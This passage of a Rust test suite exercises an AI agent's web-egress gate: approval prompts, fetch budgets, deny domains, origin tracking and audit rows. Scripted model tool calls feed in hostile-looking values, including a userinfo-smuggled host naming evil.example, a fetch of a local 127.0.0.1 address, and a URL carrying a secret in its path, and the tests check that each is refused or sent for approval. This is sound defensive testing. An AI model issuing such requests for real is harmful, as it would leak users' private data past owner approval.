            row["query_sha256"],
            json!(kernel_net::WebGate::default().text_sha256("Paris")),
            "the audit row stores the hash of the text that would leave"
        );
    }

    /// A declared host carrying userinfo is not a host: refused before any
    /// approval, and a row says so.
    struct UserinfoHost {
        ran: Arc<AtomicBool>,
    }

    #[async_trait]
    impl Tool for UserinfoHost {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            "userinfo_host"
        }

        fn schema(&self) -> serde_json::Value {
            json!({ "type": "object" })
        }

        async fn run(
            &self,
            _args: &serde_json::Value,
            _ctx: &ToolCtx,
        ) -> Result<ToolOutput, ToolError> {
            self.ran.store(true, Ordering::SeqCst);
            Ok(ToolOutput::ok("done"))
        }

        fn risk(&self) -> Risk {
            Risk::Low
        }

        fn egress_hosts(&self, _arguments: &serde_json::Value) -> &'static [&'static str] {
            &["evil.example@api.open-meteo.com"]
        }

        fn class(&self) -> ToolClass {
            ToolClass {
                performs_web_egress: true,
                ..ToolClass::default()
            }
        }
    }

    #[tokio::test]
    async fn userinfo_in_a_declared_host_is_refused_before_approval() {
        let harness = Harness::new();
        let ran = Arc::new(AtomicBool::new(false));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(UserinfoHost {
                ran: Arc::clone(&ran),
            }));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "userinfo_host", json!({}))],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(&provider, vec![], approver.clone());

        session.send("call the tool").await.unwrap();

        assert!(!ran.load(Ordering::SeqCst), "the host is refused");
        assert!(approver.calls().is_empty(), "there is nothing to approve");
        let rows = harness.store().event_payloads("web.fetch").unwrap();
        assert_eq!(rows.len(), 1);
        let row: serde_json::Value = serde_json::from_str(&rows[0]).unwrap();
        assert_eq!(row["outcome"], json!("deny:invalid_egress_host"));
    }

    /// A denied approval consumes no budget: the counters are where they were
    /// before the call.
    #[tokio::test]
    async fn a_denied_ask_leaves_the_web_budget_untouched() {
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(NotesRead));
        let ran = Arc::new(AtomicBool::new(false));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(NoUrlEgress {
                hosts: &["first.example"],
                ran: Arc::clone(&ran),
            }));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "notes_read", json!({}))],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_2", "connector_no_url", json!({}))],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        // Approves the read, denies the declared-host call.
        let approver = ApproveNotesOnly::new();
        let mut session = harness.start(&provider, vec![], approver.clone());

        session
            .send("read my notes, then call the connector")
            .await
            .unwrap();

        assert!(!ran.load(Ordering::SeqCst), "the owner denied the call");
        assert_eq!(
            session.web_budget_counts(),
            (0, 0),
            "the turn and the day counters are unchanged"
        );
    }

    /// Two declared hosts, only the first answers. Its row carries the status
    /// and bytes it sent; the second is "not contacted" with 0 bytes, and only
    /// the origin that answered joins the seen set.
    struct TwoHosts;

    #[async_trait]
    impl Tool for TwoHosts {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            "two_hosts"
        }

        fn schema(&self) -> serde_json::Value {
            json!({ "type": "object" })
        }

        async fn run(
            &self,
            _args: &serde_json::Value,
            ctx: &ToolCtx,
        ) -> Result<ToolOutput, ToolError> {
            if let Some(egress) = &ctx.egress {
                egress.note_origin_response("https://first.example/", 200);
                egress.note_origin_bytes("https://first.example/", 42);
            }
            Ok(ToolOutput::ok("done"))
        }

        fn risk(&self) -> Risk {
            Risk::Low
        }

        fn egress_hosts(&self, _arguments: &serde_json::Value) -> &'static [&'static str] {
            &["first.example", "second.example"]
        }

        fn class(&self) -> ToolClass {
            ToolClass {
                performs_web_egress: true,
                ..ToolClass::default()
            }
        }
    }

    #[tokio::test]
    async fn a_multi_host_call_attributes_each_origin_its_own_answer() {
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(TwoHosts));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "two_hosts", json!({}))],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let mut session = harness.start(&provider, vec![], RecordingApprover::new(true));

        session.send("call the two hosts").await.unwrap();

        let rows: Vec<serde_json::Value> = harness
            .store()
            .event_payloads("web.fetch")
            .unwrap()
            .iter()
            .map(|row| serde_json::from_str(row).unwrap())
            .collect();
        assert_eq!(rows.len(), 2, "one row per declared target");
        let answered = rows
            .iter()
            .find(|row| row["host"] == json!("first.example"))
            .expect("a row for the origin that answered");
        assert_eq!(answered["status"], json!("ok"));
        assert_eq!(answered["bytes"], json!(42));
        let silent = rows
            .iter()
            .find(|row| row["host"] == json!("second.example"))
            .expect("a row for the origin never contacted");
        assert_eq!(silent["status"], json!("not contacted"));
        assert_eq!(silent["bytes"], json!(0));
        assert!(session
            .web_seen_origins()
            .contains("https://first.example:443"));
        assert!(!session
            .web_seen_origins()
            .contains("https://second.example:443"));
    }

    /// `http_fetch` without a string `url` is left to the tool, which answers
    /// with its invalid-arguments error. It is not an undeclared-egress refusal:
    /// no `web.fetch` row, no card.
    #[tokio::test]
    async fn an_http_fetch_without_a_url_is_left_to_the_tool() {
        let registry = builtin_registry(ShellSandbox::default(), kernel_core::WebConfig::default());
        let harness = Harness::with_registry(registry);
        let provider = FakeProvider::scripted("fake", vec![ChatResponse::assistant("done")]);
        let mut session = harness.start(&provider, vec![], RecordingApprover::new(true));

        for arguments in [json!({}), json!({ "url": 42 })] {
            let call = ToolCall::new("call_1", "http_fetch", arguments);
            assert!(
                matches!(session.prepare_web_fetch(&call), WebPrep::NotWeb),
                "the tool checks its own arguments"
            );
        }
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 0);
    }

    /// A fetch tool that declares the web-egress class under a name that is
    /// not `http_fetch`: the engine must intercept it by class.
    struct ConnectorFetch {
        ran: Arc<AtomicBool>,
    }

    #[async_trait]
    impl Tool for ConnectorFetch {
        fn path_id(&self) -> kernel_core::privacy::PathId {
            kernel_core::privacy::PathId::B5
        }
        fn name(&self) -> &str {
            "connector_fetch"
        }

        fn schema(&self) -> serde_json::Value {
            json!({"type": "object"})
        }

        async fn run(
            &self,
            _args: &serde_json::Value,
            _ctx: &ToolCtx,
        ) -> Result<ToolOutput, ToolError> {
            self.ran.store(true, Ordering::SeqCst);
            Ok(ToolOutput::ok("page"))
        }

        fn risk(&self) -> Risk {
            Risk::Medium
        }

        fn class(&self) -> ToolClass {
            ToolClass {
                performs_web_egress: true,
                ..ToolClass::default()
            }
        }
    }

    #[tokio::test]
    async fn a_future_fetch_tool_is_gated_by_class_not_by_the_name_http_fetch() {
        // NEW-5: `prepare_web_fetch` intercepts by the `performs_web_egress`
        // class flag, so a connector fetch tool cannot bypass the URL
        // shape/deny gate by having a different name.
        let harness = Harness::new();
        let ran = Arc::new(AtomicBool::new(false));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(ConnectorFetch {
                ran: Arc::clone(&ran),
            }));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_1",
                        "connector_fetch",
                        json!({ "url": "http://127.0.0.1/secret" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "connector_fetch", Action::Allow)],
            approver.clone(),
        );

        session.send("fetch the local address").await.unwrap();

        assert!(
            !ran.load(Ordering::SeqCst),
            "the egress gate must stop the connector before it runs"
        );
        assert!(
            approver.calls().is_empty(),
            "a refused URL opens no card: {:?}",
            approver.calls()
        );
        // The refusal is audited as a web.fetch row even for the connector.
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 1);
    }

    #[tokio::test]
    async fn a_path_carried_secret_on_a_seen_host_asks_in_a_private_data_turn() {
        // Host history alone must not pass a query-free URL: on a sensitive
        // turn only the bare root of a seen origin is silent; any path or query
        // asks, and so does a re-fetch of a URL that already ran.
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(NotesRead));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(FakeFetch));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "notes_read", json!({}))],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_2",
                        "http_fetch",
                        json!({ "url": "https://seen.example/allowed" }),
                    )],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_3",
                        "http_fetch",
                        json!({ "url": "https://seen.example/log/GRID-SECRET-44000" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "http_fetch", Action::Allow)],
            approver.clone(),
        );

        session.send("read my notes, then fetch").await.unwrap();

        assert!(session
            .web_seen_origins()
            .contains("https://seen.example:443"));
        let calls = approver.calls();
        let fetches: Vec<_> = calls
            .iter()
            .filter(|call| call.tool == "http_fetch")
            .collect();
        assert_eq!(fetches.len(), 2, "{fetches:?}");
        assert_eq!(
            fetches[0].taint_source.as_deref(),
            Some(sensitive_web_ask("https://seen.example/allowed").as_str()),
            "the first fetch of the host asks"
        );
        assert_eq!(
            fetches[1].taint_source.as_deref(),
            Some(sensitive_web_ask("https://seen.example/log/GRID-SECRET-44000").as_str()),
            "a path-carried secret on the seen host must ask"
        );
    }

    #[tokio::test]
    async fn a_sensitive_turn_treats_http_and_https_as_different_origins() {
        // Seen URLs used to key on host+path+query, so a clean fetch of
        // `http://seen.example/` made `https://seen.example/` an exact
        // re-fetch. Origins are (scheme, host, port), so the https root asks.
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(NotesRead));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(FakeFetch));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "notes_read", json!({}))],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_2",
                        "http_fetch",
                        json!({ "url": "http://seen.example/" }),
                    )],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_3",
                        "http_fetch",
                        json!({ "url": "https://seen.example/" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "http_fetch", Action::Allow)],
            approver.clone(),
        );

        session
            .send("read my notes, then fetch both roots")
            .await
            .unwrap();

        let calls = approver.calls();
        let fetches: Vec<_> = calls
            .iter()
            .filter(|call| call.tool == "http_fetch")
            .collect();
        assert_eq!(fetches.len(), 2, "{fetches:?}");
        assert_eq!(
            fetches[0].taint_source.as_deref(),
            Some(sensitive_web_ask("http://seen.example/").as_str()),
            "the unseen http origin asks even at its root"
        );
        assert_eq!(
            fetches[1].taint_source.as_deref(),
            Some(sensitive_web_ask("https://seen.example/").as_str()),
            "the https origin is different, so its root asks too"
        );
        assert!(session
            .web_seen_origins()
            .contains("http://seen.example:80"));
    }

    #[tokio::test]
    async fn a_sensitive_turn_treats_a_new_port_as_a_different_origin() {
        // The effective port was dropped from the seen identity too.
        // Seeing `https://seen.example:443/` must not make `:8443/` silent.
        let web = kernel_core::WebConfig {
            port_allowlist: vec![80, 443, 8443],
            ..kernel_core::WebConfig::default()
        };
        let mut registry = builtin_registry(ShellSandbox::default(), web);
        registry.register(Box::new(NotesRead));
        registry.register(Box::new(FakeFetch));
        let harness = Harness::with_registry(registry);
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "notes_read", json!({}))],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_2",
                        "http_fetch",
                        json!({ "url": "https://seen.example:443/" }),
                    )],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_3",
                        "http_fetch",
                        json!({ "url": "https://seen.example:8443/" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "http_fetch", Action::Allow)],
            approver.clone(),
        );

        session
            .send("read my notes, then fetch both ports")
            .await
            .unwrap();

        let calls = approver.calls();
        let fetches: Vec<_> = calls
            .iter()
            .filter(|call| call.tool == "http_fetch")
            .collect();
        assert_eq!(fetches.len(), 2, "{fetches:?}");
        assert_eq!(
            fetches[0].taint_source.as_deref(),
            Some(sensitive_web_ask("https://seen.example:443/").as_str()),
            "the :443 root asks on a sensitive turn"
        );
        assert_eq!(
            fetches[1].taint_source.as_deref(),
            Some(sensitive_web_ask("https://seen.example:8443/").as_str()),
            "the :8443 root must ask even though :443 is seen: {fetches:?}"
        );
        // Both origins ran (the approver granted both cards), so both are now
        // seen; the point is that the second one had to ask first.
        assert!(session
            .web_seen_origins()
            .contains("https://seen.example:443"));
        assert!(session
            .web_seen_origins()
            .contains("https://seen.example:8443"));
    }

    #[tokio::test]
    async fn a_sensitive_turn_asks_for_the_bare_root_of_a_seen_origin() {
        // Red by design: the origin was fetched earlier in this same
        // private-data turn, so it is seen — and its bare root still asks,
        // because any silent request is a channel.
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(NotesRead));
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(FakeFetch));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new("call_1", "notes_read", json!({}))],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_2",
                        "http_fetch",
                        json!({ "url": "https://seen.example/page" }),
                    )],
                )),
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_3",
                        "http_fetch",
                        json!({ "url": "https://seen.example/" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "http_fetch", Action::Allow)],
            approver.clone(),
        );

        session.send("read my notes, then the root").await.unwrap();

        assert!(
            session
                .web_seen_origins()
                .contains("https://seen.example:443"),
            "the first fetch reached a server, so the origin is seen"
        );
        let calls = approver.calls();
        let fetches: Vec<_> = calls
            .iter()
            .filter(|call| call.tool == "http_fetch")
            .collect();
        assert_eq!(fetches.len(), 2, "{fetches:?}");
        assert_eq!(
            fetches[1].taint_source.as_deref(),
            Some(sensitive_web_ask("https://seen.example/").as_str()),
            "the bare root of a seen origin still asks on a sensitive turn"
        );
    }

    #[tokio::test]
    async fn a_failed_dns_or_connect_fetch_does_not_mark_the_origin_seen() {
        // The seen set is poisoned if a fetch that never reached a server is
        // recorded: a later non-sensitive `ask_once_per_site` turn would then
        // treat the origin as already approved. Only a received response may
        // mark it.
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(FakeFetchConnectFailure));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_1",
                        "http_fetch",
                        json!({ "url": "https://gone.example/page" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "http_fetch", Action::Allow)],
            approver.clone(),
        );

        session.send("fetch the page").await.unwrap();

        assert!(
            !session
                .web_seen_origins()
                .contains("https://gone.example:443"),
            "a DNS/connect failure must not mark the origin seen"
        );
    }

    #[tokio::test]
    async fn a_refused_redirect_hop_writes_its_own_web_fetch_row() {
        // N3: a redirect hop refused for approval gets its own `web.fetch`
        // row naming the hop host and a SHA-256 of the URL, never the URL.
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(FakeRedirectFetch));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_1",
                        "http_fetch",
                        json!({ "url": "https://origin.example/start" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(false);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "http_fetch", Action::Allow)],
            approver.clone(),
        );

        session.send("fetch the page").await.unwrap();

        // Two rows: the failed origin attempt plus the refused hop.
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 2);
    }

    #[tokio::test]
    async fn a_clean_web_fetch_runs_under_its_allow_rule_and_is_audited_and_seen() {
        let harness = Harness::new();
        harness
            .registry
            .write()
            .unwrap()
            .register(Box::new(FakeFetch));
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_1",
                        "http_fetch",
                        json!({ "url": "https://example.com/page" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        // Deny the card: the clean fetch must never reach the approver.
        let approver = RecordingApprover::new(false);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "http_fetch", Action::Allow)],
            approver.clone(),
        );

        session.send("fetch the page").await.unwrap();

        assert!(
            approver.calls().is_empty(),
            "a clean fetch of a public host under an allow rule must not ask"
        );
        assert!(session
            .web_seen_origins()
            .contains("https://example.com:443"));
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 1);
    }

    #[tokio::test]
    async fn an_edited_web_fetch_consumes_one_budget_slot() {
        let web = kernel_core::WebConfig {
            fetches_per_turn: 2,
            fetches_per_day: 2,
            per_host_per_minute: 2,
            ..kernel_core::WebConfig::default()
        };
        let mut registry = builtin_registry(ShellSandbox::default(), web);
        registry.register(Box::new(FakeFetch));
        let harness = Harness::with_registry(registry);
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_1",
                        "http_fetch",
                        json!({ "url": "https://requested.example/page" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = EditingApprover::new(json!({
            "url": "https://edited.example/page"
        }));
        let mut session = harness.start(&provider, vec![], approver);

        session.send("fetch the page").await.unwrap();

        assert_eq!(
            session.web_budget_counts(),
            (0, 0),
            "budget is reserved at connect; a fetch that never connects reserves nothing"
        );
    }

    #[tokio::test]
    async fn a_denied_domain_never_opens_a_card_and_never_runs_the_tool() {
        let web = kernel_core::WebConfig {
            deny_domains: vec!["blocked.example".to_string()],
            ..kernel_core::WebConfig::default()
        };
        let mut registry = builtin_registry(ShellSandbox::default(), web);
        registry.register(Box::new(FakeFetch));
        let harness = Harness::with_registry(registry);
        let provider = FakeProvider::scripted(
            "fake",
            vec![
                ChatResponse::new(ChatMessage::assistant_with_tool_calls(
                    "",
                    vec![ToolCall::new(
                        "call_1",
                        "http_fetch",
                        json!({ "url": "https://blocked.example/page" }),
                    )],
                )),
                ChatResponse::assistant("done"),
            ],
        );
        let approver = RecordingApprover::new(true);
        let mut session = harness.start(
            &provider,
            vec![Rule::new("main", "http_fetch", Action::Allow)],
            approver.clone(),
        );
        let session_id = session.session.id;

        session.send("fetch the blocked page").await.unwrap();

        assert!(
            approver.calls().is_empty(),
            "a denied URL is refused, never asked about"
        );
        let tool = harness
            .store()
            .list_messages(session_id)
            .unwrap()
            .into_iter()
            .find(|message| message.role == "tool")
            .expect("tool row");
        assert!(tool.content.contains("denied"), "{}", tool.content);
        assert_eq!(harness.store().event_count("web.fetch").unwrap(), 1);
    }
}
